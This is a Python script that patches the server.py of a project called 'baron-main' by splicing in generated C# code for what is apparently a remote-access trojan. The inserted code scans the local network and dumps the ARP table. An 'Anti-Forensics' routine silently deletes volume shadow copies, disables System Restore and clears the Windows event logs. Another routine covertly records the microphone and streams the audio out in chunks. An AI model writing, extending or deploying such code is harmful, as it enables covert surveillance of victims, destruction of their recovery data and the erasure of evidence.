import sys

with open('c:/Users/danya/Downloads/baron-main/server.py', 'r', encoding='utf-8') as f:
    text = f.read()

code_fix = """                            if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) {
                                string hostname = \"\";
                                try { hostname = System.Net.Dns.GetHostEntry(pip).HostName; } catch {}
                                found.Add(string.Format(\"{0,-16} {1,-30} {2}ms\",
                                    pip, hostname, reply.RoundtripTime));
                            }
                        } catch {}
                    });
                    t.IsBackground = true;
                    t.Start(target);
                    tasks.Add(t);
                    if (tasks.Count >= 50) {
                        foreach (var tt in tasks) tt.Join(2000);
                        tasks.Clear();
                    }
                }
                foreach (var tt in tasks) tt.Join(2000);
                sb.AppendLine(string.Format(\"Found {0} hosts:\\n\", found.Count));
                foreach (var h in found.OrderBy(x => x)) {
                    sb.AppendLine(h);
                }
                // ARP table
                sb.AppendLine(\"\\n=== ARP Table ===\");
                try {
                    var arp = new ProcessStartInfo {
                        FileName = \"arp\",
                        Arguments = \"-a\",
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };
                    var p = Process.Start(arp);
                    sb.AppendLine(p.StandardOutput.ReadToEnd());
                    p.WaitForExit(5000);
                } catch {}
            } catch (Exception ex) {
                sb.AppendLine(\"Error: \" + ex.Message);
            }
            return sb.ToString();
        }
    )


def _generate_sys_restore_kill_code():
    return (
        \"        // ==== Anti-Forensics ====\\n\"
        \"        static string KillSystemRestore() {\\n\"
        \"            var sb = new StringBuilder();\\n\"
        \"            try {\\n\"
        \"                var psi = new ProcessStartInfo {\\n\"
        '                    FileName = \"vssadmin.exe\",\\n'
        '                    Arguments = \"delete shadows /all /quiet\",\\n'
        \"                    WindowStyle = ProcessWindowStyle.Hidden,\\n\"
        \"                    CreateNoWindow = true,\\n\"
        \"                    UseShellExecute = false,\\n\"
        \"                    RedirectStandardOutput = true\\n\"
        \"                };\\n\"
        \"                var p = Process.Start(psi);\\n\"
        \"                sb.AppendLine(p.StandardOutput.ReadToEnd());\\n\"
        \"                p.WaitForExit(10000);\\n\"
        \"                RunHiddenPS(\\\"Disable-ComputerRestore -Drive 'C:\\\\\\\\' -ErrorAction SilentlyContinue\\\");\\n\"
        '                sb.AppendLine(\"System Restore disabled\");\\n'
        '                RunHiddenPS(\"wevtutil cl System; wevtutil cl Application; wevtutil cl Security\");\\n'
        '                sb.AppendLine(\"Event logs cleared\");\\n'
        \"            } catch (Exception ex) {\\n\"
        '                sb.AppendLine(\"Error: \" + ex.Message);\\n'
        \"            }\\n\"
        \"            return sb.ToString();\\n\"
        \"        }\\n\"
    )


def _generate_realtime_audio_code():
    return (
        \"        // ==== Real-Time Audio Streaming (Native waveIn) ====\\n\"
        \"        [DllImport(\\\"winmm.dll\\\")]\\n\"
        \"        static extern int waveInOpen(out IntPtr hWaveIn, int uDeviceID, ref WAVEFORMATEX lpFormat, waveInProc dwCallback, IntPtr dwInstance, int dwFlags);\\n\"
        \"        [DllImport(\\\"winmm.dll\\\")]\\n\"
        \"        static extern int waveInPrepareHeader(IntPtr hWaveIn, IntPtr lpWaveInHdr, int uSize);\\n\"
        \"        [DllImport(\\\"winmm.dll\\\")]\\n\"
        \"        static extern int waveInAddBuffer(IntPtr hWaveIn, IntPtr lpWaveInHdr, int uSize);\\n\"
        \"        [DllImport(\\\"winmm.dll\\\")]\\n\"
        \"        static extern int waveInStart(IntPtr hWaveIn);\\n\"
        \"        [DllImport(\\\"winmm.dll\\\")]\\n\"
        \"        static extern int waveInStop(IntPtr hWaveIn);\\n\"
        \"        [DllImport(\\\"winmm.dll\\\")]\\n\"
        \"        static extern int waveInUnprepareHeader(IntPtr hWaveIn, IntPtr lpWaveInHdr, int uSize);\\n\"
        \"        [DllImport(\\\"winmm.dll\\\")]\\n\"
        \"        static extern int waveInClose(IntPtr hWaveIn);\\n\"
        \"\\n\"
        \"        delegate void waveInProc(IntPtr hWaveIn, int uMsg, IntPtr dwInstance, IntPtr wavhdr, IntPtr dwParam2);\\n\"
        \"\\n\"
        \"        [StructLayout(LayoutKind.Sequential)]\\n\"
        \"        struct WAVEFORMATEX {\\n\"
        \"            public short wFormatTag;\\n\"
        \"            public short nChannels;\\n\"
        \"            public int nSamplesPerSec;\\n\"
        \"            public int nAvgBytesPerSec;\\n\"
        \"            public short nBlockAlign;\\n\"
        \"            public short wBitsPerSample;\\n\"
        \"            public short cbSize;\\n\"
        \"        }\\n\"
        \"\\n\"
        \"        [StructLayout(LayoutKind.Sequential)]\\n\"
        \"        struct WAVEHDR {\\n\"
        \"            public IntPtr lpData;\\n\"
        \"            public int dwBufferLength;\\n\"
        \"            public int dwBytesRecorded;\\n\"
        \"            public IntPtr dwUser;\\n\"
        \"            public int dwFlags;\\n\"
        \"            public int dwLoops;\\n\"
        \"            public IntPtr lpNext;\\n\"
        \"            public IntPtr reserved;\\n\"
        \"        }\\n\"
        \"\\n\"
        \"        static waveInProc _waveInCb;\\n\"
        \"        static IntPtr _hWaveIn;\\n\"
        \"        static bool rtAudioRunning = false;\\n\"
        \"\\n\"
        \"        static void StartRealtimeAudio() {\\n\"
        \"            if (rtAudioRunning) return;\\n\"
        \"            rtAudioRunning = true;\\n\"
        \"\\n\"
        \"            WAVEFORMATEX fmt = new WAVEFORMATEX();\\n\"
        \"            fmt.wFormatTag = 1; \\n\"
        \"            fmt.nChannels = 1;\\n\"
        \"            fmt.nSamplesPerSec = 16000;\\n\"
        \"            fmt.wBitsPerSample = 16;\\n\"
        \"            fmt.nBlockAlign = (short)(fmt.nChannels * fmt.wBitsPerSample / 8);\\n\"
        \"            fmt.nAvgBytesPerSec = fmt.nSamplesPerSec * fmt.nBlockAlign;\\n\"
        \"            fmt.cbSize = 0;\\n\"
        \"\\n\"
        \"            _waveInCb = new waveInProc(WaveInCallback);\\n\"
        \"            int res = waveInOpen(out _hWaveIn, -1, ref fmt, _waveInCb, IntPtr.Zero, 0x30000);\\n\"
        \"            if (res != 0) {\\n\"
        \"                Res(\\\"audio_error\\\", \\\"RT Audio error: waveInOpen failed \\\" + res);\\n\"
        \"                rtAudioRunning = false;\\n\"
        \"                return;\\n\"
        \"            }\\n\"
        \"\\n\"
        \"            for (int i=0; i<3; i++) {\\n\"
        \"                IntPtr pWaveHdr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WAVEHDR)));\\n\"
        \"                WAVEHDR hdr = new WAVEHDR();\\n\"
        \"                hdr.dwBufferLength = fmt.nAvgBytesPerSec / 2;\\n\"
        \"                hdr.lpData = Marshal.AllocHGlobal(hdr.dwBufferLength);\\n\"
        \"                Marshal.StructureToPtr(hdr, pWaveHdr, false);\\n\"
        \"                waveInPrepareHeader(_hWaveIn, pWaveHdr, Marshal.SizeOf(typeof(WAVEHDR)));\\n\"
        \"                waveInAddBuffer(_hWaveIn, pWaveHdr, Marshal.SizeOf(typeof(WAVEHDR)));\\n\"
        \"            }\\n\"
        \"            waveInStart(_hWaveIn);\\n\"
        \"        }\\n\"
        \"\\n\"
        \"        static void WaveInCallback(IntPtr hwi, int uMsg, IntPtr dwInstance, IntPtr wavhdrPtr, IntPtr dwParam2) {\\n\"
        \"            if (uMsg == 0x3BF && rtAudioRunning) {\\n\"
        \"                WAVEHDR hdr = (WAVEHDR)Marshal.PtrToStructure(wavhdrPtr, typeof(WAVEHDR));\\n\"
        \"                if (hdr.dwBytesRecorded > 0) {\\n\"
        \"                    byte[] pcm = new byte[hdr.dwBytesRecorded];\\n\"
        \"                    Marshal.Copy(hdr.lpData, pcm, 0, hdr.dwBytesRecorded);\\n\"
        \"                    WAVEFORMATEX fmt = new WAVEFORMATEX { nChannels=1, nSamplesPerSec=16000, wBitsPerSample=16 };\\n\"
        \"                    byte[] fullWav = new byte[pcm.Length + 44];\\n\"
        \"                    byte[] header = CreateWavHeader(fmt, pcm.Length);\\n\"
        \"                    Buffer.BlockCopy(header, 0, fullWav, 0, 44);\\n\"
        \"                    Buffer.BlockCopy(pcm, 0, fullWav, 44, pcm.Length);\\n\"
        \"                    SendAudioChunk(fullWav);\\n\"
        \"                    waveInAddBuffer(hwi, wavhdrPtr, Marshal.SizeOf(typeof(WAVEHDR)));\\n\"
        \"                }\\n\"
        \"            }\\n\"
        \"        }\\n\"
        \"\\n\"
        \"        static void StopRealtimeAudio() {\\n\"
        \"            rtAudioRunning = false;\\n\"
        \"            waveInStop(_hWaveIn);\\n\"
        \"        }\\n\"
"""

code_fix = code_fix.replace('\n', '\n        \"').replace('        \"\\n', '        \"\\n\"').replace('""', '"')

code_fix = '        "' + code_fix + '    )\n'

start_marker = "                            if (reply.Status == System.Net.NetworkInformation.IPStatus.Success) {"
end_marker = "        static byte[] CreateWavHeader(WAVEFORMATEX fmt, int dataSize) {"

parts1 = text.split(start_marker)
parts2 = text.split(end_marker)

if len(parts1) >= 2 and len(parts2) >= 2:
    new_text = parts1[0] + start_marker + '\n' + code_fix + '\n' + end_marker + parts2[1]
    
    # We also need to fix a duplicate CreatesWavHeader part if any.
    # Actually, parts2[1] starts with the rest of CreateWavHeader, so we just attach it.
    with open('c:/Users/danya/Downloads/baron-main/server.py', 'w', encoding='utf-8') as f:
        f.write(new_text)
    print('FIXED')
else:
    print('COULD NOT FIND MARKERS')
